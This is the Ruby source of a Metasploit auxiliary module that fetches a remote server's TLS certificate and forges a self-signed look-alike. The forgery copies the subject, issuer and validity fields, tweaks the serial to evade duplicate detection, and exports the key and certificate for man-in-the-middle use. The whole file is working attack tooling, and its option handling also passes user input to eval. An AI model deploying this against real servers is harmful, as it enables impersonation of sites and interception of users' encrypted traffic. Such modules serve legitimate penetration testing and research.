##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP SSL Certificate Impersonation',
			'Version'     => '$Revision$',
			'Author'      => ' Chris John Riley',
			'License'     => MSF_LICENSE,
			'Description' => %q{
					This module request a copy of the remote SSL certificate and creates a local
					(self.signed) version using the information from the remote version.
					The module then Outputs (PEM|DER) format private key / certificate and a
					combined version for use in Apache or other Metasploit modules requiring SSLCert
			}
		)

		register_options(
			[
				Opt::RPORT(443),
				OptString.new('OUT_FORMAT', [true, "Output format PEM / DER", 'PEM']),
				OptString.new('EXPIRATION', [false, "Date the new cert should expire (e.g. 06 May 2012, Yesterday or Now)", '']),
			], self.class)
	end

	def run

		print_status("Connecting to #{rhost}:#{rport}")

		begin
			connect
			cert  = OpenSSL::X509::Certificate.new(sock.peer_cert) # Get certificate from remote rhost
			disconnect
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE => e
			print_error(e.message)
		end

		if(not cert)
			print_error("#{rhost} No certificate subject or CN found")
			return
		end

		print_status("Copying certificate #{cert.subject.to_s} from #{rhost}:#{rport}")
		vprint_status("Original Certifcate Details\n\n#{cert.to_text}")

		begin
			keylength = /Modulus \((\d+) bit\)/i.match(cert.to_text)[1] # Grab keylength from target cert
		rescue
			keylength = 1024
		end

		begin
			hashtype = /Signature Algorithm: (\w+)With/i.match(cert.to_text)[1] # Grab hashtype from target cert
		rescue
			hashtype = 'sha1'
		end

		new_key = OpenSSL::PKey::RSA.new(keylength.to_i)
		new_cert = OpenSSL::X509::Certificate.new

		new_cert.public_key = new_key.public_key
		ef = OpenSSL::X509::ExtensionFactory.new(nil,new_cert)

		new_cert.extensions = [
			ef.create_extension("basicConstraints","CA:FALSE"),
			ef.create_extension("subjectKeyIdentifier","hash"),
			ef.create_extension("extendedKeyUsage","critical,serverAuth"),
			ef.create_extension("keyUsage", "keyEncipherment,dataEncipherment,digitalSignature")
		]

		ef.issuer_certificate = new_cert

		# Duplicate information from the remote certificate
		entries = ['version','serial','subject','issuer','not_before','not_after']
		entries.each do | ent |
			eval("new_cert.#{ent} = cert.#{ent}")
		end

		if datastore['EXPIRATION'] != ''
			print_status("Altering certificate expiry information to #{datastore['EXPIRATION']}")

			case datastore['EXPIRATION'].downcase
			when 'yesterday'
				new_cert.not_after = 24.hours.ago
				new_cert.not_before = 1.year.ago - 24.hours # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			when 'now'
				new_cert.not_after = Time.now
				new_cert.not_before = 1.year.ago # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			else
				new_cert.not_after = Time.parse(datastore['EXPIRATION'])
				new_cert.not_before = Time.parse(datastore['EXPIRATION']) - 1.year # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			end
		end

		# Alter serial to avoid duplicate issuer/serial detection
		if (cert.serial.to_s.length > 1)
			new_cert.serial = (cert.serial.to_s[0..-3] + cert.serial.to_s[-1] + cert.serial.to_s[-2]).to_i
		else
			new_cert.serial = rand(0xFF)
		end

		new_cert.add_extension(ef.create_extension("authorityKeyIdentifier","critical,keyid:always,issuer:always"))
		new_cert.sign(new_key, eval("OpenSSL::Digest::#{hashtype.upcase}.new"))

		vprint_status("Duplicate Certificate Details\n\n#{new_cert.to_text}")
		print_status("Beginning export of certificate files")

		priv_key = new_key.send(eval("\"to_#{datastore['OUT_FORMAT'].downcase}\""))
		cert_crt = new_cert.send(eval("\"to_#{datastore['OUT_FORMAT'].downcase}\""))
		combined = new_key.send("to_pem") + new_cert.send("to_pem")

		store_loot("imp_ssl.key", datastore['OUT_FORMAT'].downcase, rhost, priv_key, "imp_ssl.key", "Impersonate_SSL")
		store_loot("imp_ssl.crt", datastore['OUT_FORMAT'].downcase, rhost, cert_crt, "imp_ssl.crt", "Impersonate_SSL")
		store_loot("imp_ssl.pem", "pem", rhost, combined, "imp_ssl.pem", "Impersonate_SSL")

		print_good("Created required files from remote server #{rhost}:#{rport}")
		print_good("Files stored in ~/.msf3/loot (.key|.crt|.pem)")

	end
end